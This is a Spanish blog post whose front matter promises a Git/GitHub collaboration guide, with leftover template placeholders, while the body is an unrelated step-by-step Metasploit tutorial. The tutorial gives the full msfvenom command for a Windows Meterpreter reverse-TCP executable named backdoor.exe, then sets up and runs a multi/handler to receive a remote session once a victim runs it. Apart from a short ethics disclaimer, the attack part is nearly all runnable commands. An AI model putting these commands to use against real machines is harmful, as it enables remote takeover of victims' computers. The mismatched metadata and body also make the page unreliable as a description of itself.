---
# documentmode: jou  # Modo de documento: Can be jou (journal), man (manuscript), stu (student), or doc (document)
    # - man (Manuscrito): Similar al formato .docx
    # - jou (Revista): Un formato pulido de dos columnas similar a muchas revistas APA.
    # - doc (Documento): Similar al predeterminado LaTex artículos.
    # - stu (Estudiante): Formateado para trabajos de estudiantes
# MODO ESTUDIANTE (STU)
# course: Metodología (EDUC 5101)
# professor: Dr. Edison Achalma Mendoza
# duedate: 01/23/2022
# MODO REVISTA (JOU)
# journal: The American Economic Review # Econometrica, The American Economic Review, Revista de Economía, Revista de la CEPAL
# volume: 2025, Vol. 131, No. 2, 10--60
copyrightnotice: 2024
copyrightext: All rights reserved
# image: featured.png
title: Guía de Git Cómo trabajar en equipo en proyectos
subtitle: Aprende a usar Git para controlar versiones, colaborar con otros desarrolladores y mantener tu código organizado.
shorttitle: "Editar"
abstract: |
  Primer parrafo de abstrac
keywords: [keyword1, keyword2]
categories:
  - Operating System
  - GitHub
tags:
  - Git
  - GitHub
  - Colaboración
  - DesarrolloDeSoftware
  - GitBasics
  - GitAdvanced
  - GitTips
  - OpenSource

# Nota del Autor
author-note:
  status-changes: 
    # Ejemplo: [Nombre del autor] está ahora en [afiliación].
    affiliation-change: ~
    # Ejemplo: [Nombre del autor] ha fallecido.
    deceased: ~
  # Las divulgaciones se condensan en un párrafo, pero puede iniciar un campo con dos saltos de línea para separarlas: \n\nNew 
  disclosures:
    # Ejemplo: Este estudio se registró en X (Identificador Y).
    study-registration: ~
    # Reconozca y cite los datos/materiales que se van a compartir.
    data-sharing: ~
    # Ejemplo: Este artículo se basa en datos publicados en [Referencia].
    # Ejemplo: Este artículo se basa en la disertación realizada por [cita].
    related-report: ~
    # Ejemplo: [Nombre del autor] ha sido consultor remunerado de la Corporación X, que ha financiado este estudio.
    conflict-of-interest: El autor no tiene conflictos de interés que revelar.
    # Ejemplo: Este estudio ha contado con el apoyo de la subvención [Número de subvención] de [Fuente de financiación].
    financial-support: ~
    # Ejemplo: Los autores agradecen a [Persona] por [Motivo].
    gratitude: ~
    # Ejemplo. Dado que los autores contribuyen por igual, el orden de autoría se determinó mediante el lanzamiento de una moneda al aire.
    authorship-agreements: ~

description: '' # Texto que se muestra debajo de las etiquetas, no en la página del listado
# links:
# - icon: pin-map-fill
#   name: Collection of maps
#   url: /project/2024-06-16-ccd-sips #./../talk/2021-03-16-xaringan-deploy-demo/
# - icon: github
#   icon_pack: fab
#   name: R-Ladies template files
#   url: https://github.com/spcanelon/RLadies-xaringan-template
eval: false # true(predeterminado): evaluar celda de código, false: no evaluar la celda de código
# Google Scholar
# bibliography: mybibliography.bib
citation:
  type: article-journal
  author:
    - Edison Achalma
  pdf-url: https://achalmaedison.netlify.app/tecnologia-seguridad/operating-system/2023-02-16-guia-de-git-y-github/index.pdf
date: "02/16/2023"
draft: false  # Modo de borrador (false = final, true = borrador)
---









# Creando y Ejecutando un Payload Malicioso con Metasploit: Una Guía Paso a Paso

Hola a todos! Hoy vamos a sumergirnos en el fascinante mundo de la seguridad informática y la creación de un payload malicioso usando Metasploit. Si bien esta guía es con fines educativos, es crucial recordar que utilizar estas herramientas para actividades maliciosas es ilegal y antiético. ¡Usémoslas para aprender y proteger!

# Paso 1: Obtener la Dirección IP con ifconfig

Primero, necesitamos conocer nuestra dirección IP local para configurar el payload. Usamos el comando `ifconfig` para obtener esta información. Abre tu terminal y escribe:

```sh
ifconfig
```

Esto mostrará todas las interfaces de red y sus respectivas direcciones IP. Busca la IP de tu red local. En este ejemplo, supongamos que es `192.168.122.152`.

# Paso 2: Crear el Payload con msfvenom

Ahora que tenemos nuestra dirección IP, vamos a crear el payload. Usaremos `msfvenom`, una herramienta que viene con Metasploit para generar payloads maliciosos. Queremos crear un payload que permita un acceso remoto a una máquina con Windows. Usamos el siguiente comando:

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.122.152 LPORT=4444 -f exe -o backdoor.exe -a x64
```

Desglosamos el comando:

- `-p windows/x64/meterpreter/reverse_tcp`: Especificamos el payload, que en este caso es un Meterpreter reverse TCP para Windows de 64 bits.
- `LHOST=192.168.122.152`: Establecemos nuestra dirección IP local como el host de escucha.
- `LPORT=4444`: Elegimos el puerto de escucha (puedes cambiarlo si es necesario).
- `-f exe`: Indicamos que el formato de salida debe ser un archivo ejecutable de Windows.
- `-o backdoor.exe`: Nombramos el archivo de salida `backdoor.exe`.
- `-a x64`: Especificamos la arquitectura del payload (64 bits).

# Paso 3: Configurar el Handler en Metasploit

Una vez que tenemos nuestro payload, necesitamos configurar un handler en Metasploit para escuchar las conexiones entrantes. Iniciamos Metasploit con:

```sh
msfconsole -q
```

La opción `-q` es para iniciar Metasploit en modo silencioso.

# Paso 4: Configurar el Exploit Handler

En la consola de Metasploit, seguimos estos pasos:

1. **Seleccionar el handler**:

   ```sh
   msf6 > use exploit/multi/handler
   ```

   Esto indica que usaremos el módulo handler para gestionar la conexión entrante.

2. **Configurar el payload**:

   ```sh
   msf6 > set payload windows/x64/meterpreter/reverse_tcp
   ```

3. **Establecer el LHOST y LPORT**:

   ```sh
   msf6 > set lhost 192.168.122.152
   msf6 > set lport 4444
   ```

4. **Verificar las opciones**:

   ```sh
   msf6 > show options
   ```

   Esto muestra todas las opciones configuradas para asegurar que todo esté correcto.

# Paso 5: Ejecutar el Handler

Finalmente, ejecutamos el handler para empezar a escuchar conexiones:

```sh
msf6 > run
```

Ahora, el handler está activo y esperando que alguien ejecute el `backdoor.exe` en su máquina. Cuando esto suceda, obtendrás una sesión de Meterpreter y podrás interactuar con la máquina comprometida.

# Conclusión

Este proceso demuestra cómo se puede crear y manejar un payload malicioso usando Metasploit. Nuevamente, subrayo la importancia de utilizar este conocimiento de manera ética y legal, principalmente para probar y fortalecer la seguridad de sistemas. Siempre asegúrate de tener permiso para realizar estas pruebas.

Espero que hayas encontrado esta guía informativa y útil. ¡Hasta la próxima!







# Publicaciones Similares

Si te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:


1. [{{< fa regular file-pdf >}}](https://achalmaedison.netlify.app/tecnologia-seguridad/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/index.pdf) [Ejecutando Payload](https://achalmaedison.netlify.app/tecnologia-seguridad/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload)


Esperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!

